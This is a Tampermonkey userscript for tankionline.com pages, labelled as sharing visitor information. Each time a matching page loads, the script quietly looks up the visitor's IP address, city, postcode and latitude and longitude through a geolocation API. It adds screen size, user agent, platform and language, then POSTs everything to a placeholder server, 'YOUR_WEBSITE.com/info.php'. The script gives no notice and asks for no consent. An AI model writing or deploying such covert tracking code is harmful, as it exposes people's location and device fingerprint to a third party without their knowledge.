// ==UserScript==
// @name         Information
// @namespace    http://tampermonkey.net/
// @version      0.0
// @description  Share visitor information with a server endpoint
// @author       Hi_Hi_CycIone
// @match        https://*.tankionline.com/*
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function() {
    'use strict';

    function sendData(data) {
        GM_xmlhttpRequest({
            method: "POST",
            url: "https://YOUR_WEBSITE.com/info.php",
            data: JSON.stringify(data),
            headers: {
                "Content-Type": "application/json"
            },
            onload: function(response) {
                console.log(response.responseText);
            },
            onerror: function(error) {
                console.error(error);
            }
        });
    }

    const ipData = {};
    GM_xmlhttpRequest({
        method: "GET",
        url: "https://api.ipbase.com/v1/json/",
        onload: function(response) {
            const data = JSON.parse(response.responseText);
            ipData.ip = data.ip;
            ipData.country_code = data.country_code;
            ipData.country_name = data.country_name;
            ipData.region_code = data.region_code;
            ipData.region_name = data.region_name;
            ipData.city = data.city;
            ipData.zip_code = data.zip_code;
            ipData.time_zone = data.time_zone;
            ipData.latitude = data.latitude;
            ipData.longitude = data.longitude;
            ipData.metro_code = data.metro_code;

            const screenSize = {
                width: screen.width,
                height: screen.height
            };

            const osData = {
                name: navigator.platform,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                userAgent: navigator.userAgent,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled
            };

            const visitorData = {
                ip: ipData.ip,
                country_code: ipData.country_code,
                country_name: ipData.country_name,
                region_code: ipData.region_code,
                region_name: ipData.region_name,
                city: ipData.city,
                zip_code: ipData.zip_code,
                time_zone: ipData.time_zone,
                latitude: ipData.latitude,
                longitude: ipData.longitude,
                metro_code: ipData.metro_code,
                screen_width: screenSize.width,
                screen_height: screenSize.height,
                os: osData
            };
            console.log(visitorData);
            sendData(visitorData);
        },
        onerror: function(error) {
            console.error(error);
        }
    });

})();
